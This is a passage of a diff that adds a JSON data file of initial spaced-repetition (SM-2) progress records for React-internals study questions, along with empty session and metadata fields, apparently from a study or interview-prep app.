+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-react-internals-001",
+      "questionId": "react-internals-001",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-react-internals-002",
+      "questionId": "react-internals-002",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    },
+    {
+      "id": "progress-react-internals-003",
+      "questionId": "react-internals-003",
+      "sm2": {
+        "easeFactor": 2.5,
+        "interval": 0,
+        "repetitions": 0,
+        "nextReviewDate": "2026-01-30T23:53:35.573Z",
+        "lastReviewDate": null
+      },
+      "totalReviews": 0,
+      "correctReviews": 0,
+      "averageQuality": 0,
+      "reviewHistory": [],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z"
+    }
+  ],
+  "sessions": [],
+  "metadata": {
+    "version": 1,
+    "createdAt": "2026-01-30T23:53:35.573Z",
+    "updatedAt": "2026-01-30T23:53:35.573Z",
+    "totalStudySessions": 0,
+    "totalInterviewSessions": 0,
+    "studyStreak": 0,
+    "lastStudyDate": null
+  }
+}
